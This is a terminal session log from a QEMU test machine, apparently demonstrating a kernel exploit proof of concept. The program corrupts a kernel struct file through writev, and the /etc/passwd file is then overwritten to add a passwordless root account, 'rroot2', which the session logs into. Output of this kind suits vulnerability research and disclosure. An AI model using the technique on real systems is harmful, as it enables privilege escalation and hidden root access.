root@syzkaller:~# cat /etc/passwd
root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
messagebus:x:106:113::/var/run/dbus:/bin/false
user1:x:1000:1000:,,,:/home/user1:/bin/bash
user2:x:1001:1001:,,,:/home/user2:/bin/bash
user3:x:1002:1003::/home/user3:
root@syzkaller:~# cat /etc/passwd
root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
messagebus:x:106:113::/var/run/dbus:/bin/false
user1:x:1000:1000:,,,:/home/user1:/bin/bash
user2:x:1001:1001:,,,:/home/user2:/bin/bash
user3:x:1002:1003::/home/user3:
root@syzkaller:~# ./prog.o 
[+] Started the poc process with pid = 325,running on [uid,gid,euid,egid] = [0,0,0,0]
[+] Started the parser for (pid = 325, root_pid = 324)! Parser running on [uid,gid,euid,egid] = [0,0,0,0]
[+] Started the root process with pid = 324,running on [uid,gid,euid,egid] = [0,0,0,0]
[+] Started the syscalls!
[+] SLEEPING AND PARSING...
[.] Parser indicates 10 poc objects and 3 root objects are allocated
	[poc]``->`0xffff88803d448600`
	[poc]`%struct.buffer_head*`->`0xffff88803cbd07b8`
	[poc]`%struct.extent_status*`->`0xffff88803cbc0758`
	[poc]`%struct.dentry*`->`0xffff88803cbd1300`
	[poc]`%struct.anon_vma*`->`0xffff8880370a35d8`
	[poc]`%struct.avc_node*`->`0xffff88803db20630`
	[poc]`%struct.anon_vma_chain*`->`0xffff8880370b3e00`
	[poc]`%struct.file*`->`0xffff88803705d900`
	[poc]`%struct.filename*`->`0xffff88803e532000`
	[poc]``->`0xffff888039fea270`
	[root]``->`0xffff888039fea2a0`
	[root]`%struct.filename*`->`0xffff88803e532000`
	[root]`%struct.file*`->`0xffff88803705d100`
[+] Kernel memory at address `0xffff88803705d100`(+240) has value: [ 68 df 98 3c 80 88 ff ff ]
[parser] Writing the corruption (size: 8) at user-address `0x135f9a0` into kernel memory `0xffff88803705d900`(+240).
[+] Corruption succeeded!
[?] Corruption should be done or failed!
[++] WRITEV WORKED!
[+] Root exiting!
root@syzkaller:~# cat /etc/passwd
rroot2::0:0:root2:/root:/bin/bash
mon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
messagebus:x:106:113::/var/run/dbus:/bin/false
user1:x:1000:1000:,,,:/home/user1:/bin/bash
user2:x:1001:1001:,,,:/home/user2:/bin/bash
user3:x:1002:1003::/home/user3:
root@syzkaller:~# su rroot2
rroot2@syzkaller:~# exit
QEMU: Terminated
